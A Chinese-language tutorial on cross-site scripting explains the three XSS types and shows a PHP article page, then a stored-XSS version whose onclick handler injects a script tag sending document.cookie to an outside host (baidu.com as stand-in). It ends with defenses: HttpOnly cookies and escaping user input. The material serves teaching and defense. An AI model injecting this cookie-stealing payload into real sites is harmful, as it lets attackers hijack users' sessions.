### 什么是XSS攻击?
XSS攻击全称跨站脚本攻击 , XSS分为3种类型 分别是反射型 , 存储型 和 DOM型 , 主要是利用 js 和 html 标签未经过转义和过滤

### 正常文章
这是一个php脚本文件 , 作用是启动 session 并在session内存入user_id字段 , 并且展示了一篇文章 , 众所周知 session 其实就是一个cookie , 只不过这个cookie的name是ssid罢了 (可通过php.ini设置session名称) , 而 cookie 的出现是为了解决 http 无状态协议的缺点 , cookie 就是你的身份证 , 如果cookie被盗 那么不法分子可以利用你的cookie(身份证) 为所欲为


```php
<?php

session_start();
$_SESSION['user_id'] = 99;

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css">
        div{text-align: center}
    </style>
</head>
<body>
<div>
    <h1>这是一篇文章</h1>
    <p>文章内容</p>
</div>
</body>
</html>
```
![](/assets/xss-1.png)

上面的h1标签和p标签是用户发步的 , 就好比我现在在写这篇文章 , 当我写完点击发送时 , 其实发送的是带标签的html文档 , 我们可以找到发送文章的接口 , 然后将带xss的文章发送出去 , 当然发送的时候需要带你的cookie

### 带XSS的文章
```php
<?php

session_start();
$_SESSION['user_id'] = 99;

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css">
        div{text-align: center}
    </style>
</head>
<body>
<div>
    <h1>这是一篇文章</h1>
    <p onclick="(function(){document.write('<script src=\'https://baidu.com?cookie='+ document.cookie +'\'></script>' )})()">文章内容</p>
</div>
</body>
</html>
```
发送后数据将永久的存在于服务器的数据库和文件内 , 可以看到 页面内容完全没有变化 , 但是我注入了一个 onclick 事件 , 他的作用是当用户点击内容的时候 , 会向 baidu.com 的域名上发起一个Get请求 , 参数是cookie , 而如果百度记录了你的请求 , 那么恭喜你 , 你的cookie(包括session)成功被盗
![](/assets/xss-3.png)
这里有先决条件, 第一我提交了具有XSS的文章, 并且没有被服务端过滤掉, 第二你触发了我的陷阱,第三你是登录状态, 那么我才有可能得到你数据.

### 如何防患
1. 在Set-Cookie首部字段内加入 `HttpOnly` , 禁止 javascript 访问cookie的内容
2. 对用户的数据进行过滤和转义